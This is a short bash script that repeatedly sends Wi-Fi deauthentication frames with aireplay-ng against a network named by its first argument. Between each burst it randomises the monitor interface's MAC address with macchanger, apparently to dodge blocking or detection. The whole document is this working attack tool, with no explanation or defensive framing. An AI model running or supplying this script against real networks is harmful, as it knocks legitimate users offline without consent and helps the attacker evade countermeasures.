#!/bin/bash
while true
do
    aireplay-ng -0 1 -e $1 wlan0mon | grep "DeAuth"
    ifconfig wlan0mon down
    macchanger -r wlan0mon | grep "New MAC"
    ifconfig wlan0mon up
    sleep 1
    
done
